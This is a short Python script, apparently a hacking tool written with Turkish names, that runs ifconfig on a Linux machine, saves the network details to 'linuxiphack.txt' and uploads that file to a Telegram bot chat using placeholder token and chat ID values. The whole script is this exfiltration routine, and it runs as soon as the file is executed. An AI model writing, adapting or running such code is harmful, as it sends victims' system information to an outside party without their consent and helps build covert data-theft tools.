import requests 
import subprocess

TOKEN = "tokeniniz"
chat_id = "chat_id"

def ipbilgial_linux():
    ip_info = subprocess.run(["ifconfig"], stdout=subprocess.PIPE, text=True)
    çıktı = ip_info.stdout
    
    with open("linuxiphack.txt", "w") as dosya:
        dosya.write(çıktı) 
        
    dosyakonumu = subprocess.run(["realpath", "linuxiphack.txt"], stdout=subprocess.PIPE, text=True)
    dosyakonumu_str = dosyakonumu.stdout.strip()
    file_path = "linuxiphack.txt"
    api = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    
    
    with open(file_path, "rb") as file:
        files = {"document": file_path}
    response = requests.post(api, data={"chat_id": chat_id}, files={"document": open(file_path, "rb")})



ipbilgial_linux()
